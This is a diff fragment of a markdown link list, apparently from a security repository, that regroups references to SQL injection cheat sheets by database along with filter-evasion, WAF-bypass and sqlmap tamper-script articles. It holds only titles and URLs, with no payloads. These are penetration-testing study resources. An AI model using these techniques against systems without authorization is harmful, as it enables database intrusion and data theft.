-  * [Access SQLi Cheatsheet](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
-  * [PentestMonkey's Ingres SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet)
-  * [Pentestmonkey's DB2 SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)
-  * [Pentestmonkey's Informix SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet)
-  * [SQLite3 Injection Cheat sheet](https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)
-  * [Ruby on Rails (Active Record) SQL Injection Guide](http://rails-sqli.org/)
-  * [ForkBombers SQLMap Tamper Scripts Update](http://www.forkbombers.com/2016/07/sqlmap-tamper-scripts-update.html)
-  * [SQLi in INSERT worse than SELECT](https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)
-  * [Manual SQL Injection Tips](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
-* Second Order:
-  * [Analyzing CVE-2018-6376 – Joomla!, Second Order SQL Injection](https://www.notsosecure.com/analyzing-cve-2018-6376/)
-  * [Exploiting Second Order SQLi Flaws by using Burp & Custom Sqlmap Tamper](https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/)
-* Sqlmap:
-  * [#SQLmap protip @zh4ck](https://twitter.com/zh4ck/status/972441560875970560)
-* WAF:
-  * [SQLi Optimization and Obfuscation Techniques](https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2013/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf) by Roberto Salgado
-  * [A Scientific Notation Bug in MySQL left AWS WAF Clients Vulnerable to SQL Injection](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/)
-                                                                            
+- Detect SQLi
+  - [Manual SQL Injection Discovery Tips](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
+  - [NetSPI SQL Injection Wiki](https://sqlwiki.netspi.com/)
+- MySQL:
+  - [PentestMonkey's mySQL injection cheat sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
+  - [Reiners mySQL injection Filter Evasion Cheatsheet](https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/)
+  - [Alternative for Information_Schema.Tables in MySQL](https://osandamalith.com/2017/02/03/alternative-for-information_schema-tables-in-mysql/)
+  - [The SQL Injection Knowledge base](https://websec.ca/kb/sql_injection)
+- MSSQL:
+  - [EvilSQL's Error/Union/Blind MSSQL Cheatsheet](http://evilsql.com/main/page2.php)
+  - [PentestMonkey's MSSQL SQLi injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
+- ORACLE:
+  - [PentestMonkey's Oracle SQLi Cheatsheet](http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
+- POSTGRESQL:
+  - [PentestMonkey's Postgres SQLi Cheatsheet](http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)
+- Others
+  - [SQLi Cheatsheet - NetSparker](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
+  - [Access SQLi Cheatsheet](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
+  - [PentestMonkey's Ingres SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet)
+  - [Pentestmonkey's DB2 SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)
+  - [Pentestmonkey's Informix SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet)
+  - [SQLite3 Injection Cheat sheet](https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)
+  - [Ruby on Rails (Active Record) SQL Injection Guide](http://rails-sqli.org/)
+  - [ForkBombers SQLMap Tamper Scripts Update](http://www.forkbombers.com/2016/07/sqlmap-tamper-scripts-update.html)
+  - [SQLi in INSERT worse than SELECT](https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)
+  - [Manual SQL Injection Tips](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
+- Second Order:
+  - [Analyzing CVE-2018-6376 – Joomla!, Second Order SQL Injection](https://www.notsosecure.com/analyzing-cve-2018-6376/)
+  - [Exploiting Second Order SQLi Flaws by using Burp & Custom Sqlmap Tamper](https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/)
+- Sqlmap:
+  - [#SQLmap protip @zh4ck](https://twitter.com/zh4ck/status/972441560875970560)
+- WAF:
+  - [SQLi Optimization and Obfuscation Techniques](https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2013/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf) by Roberto Salgado
+  - [A Scientific Notation Bug in MySQL left AWS WAF Clients Vulnerable to SQL Injection](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/)
